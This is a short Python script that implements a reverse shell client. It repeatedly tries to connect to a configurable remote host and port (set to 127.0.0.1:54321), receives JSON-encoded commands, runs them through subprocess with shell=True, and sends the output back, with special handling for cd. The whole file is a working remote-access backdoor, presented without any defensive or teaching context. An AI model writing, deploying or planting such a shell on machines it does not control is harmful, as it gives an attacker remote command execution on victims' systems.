#!/usr/bin/python

import socket
import subprocess
import json
import time
import os

# Variables
RHOST = "127.0.0.1"	#Remote host
RPORT = 54321		#Remote port
time_sleep = 1		#Time to try to connect

def reliable_send(data):
	# If data is bytes
	if type(data) is bytes:
		# Convert to str
		data = data.decode()

	json_data = json.dumps(data)
	s.send(json_data.encode())

def reliable_recv():
	json_data = ""
	while True:
		try:
			json_data += s.recv(1024).decode()
			return json.loads(json_data)
		except ValueError:
			continue

def init_client():
	global s

	# Create socket
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	# Connect socket
	while True:
		try:
			s.connect((RHOST, RPORT))
			print("Connection Established to Server")
			return
		except ConnectionRefusedError:
			time.sleep(time_sleep)

def shell():
	while True:
		# Send/Receive commands
		command = reliable_recv()

		if command == "q" or command == "exit":
			print("Connection Closed!")
			break
		elif command[:2] == "cd":
			if len(command) > 2 and command[2:].replace(" ", "") != "":
				if command[2] != " ":
					reliable_send("Can't execute that command!")
				else:
					try:
						os.chdir(command[3:])
						reliable_send("")
					except FileNotFoundError:
						reliable_send("No such file or directory")
			else:
				reliable_send("")
		else:
			try:
				proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				result = proc.stdout.read() + proc.stderr.read()
				reliable_send(result)
			except:
				reliable_send("Can't execute that command!")

# Close connection
def close():
	s.close()


# Functions call
def main():
	init_client()
	shell()
	close()

if __name__ == "__main__":
	main()
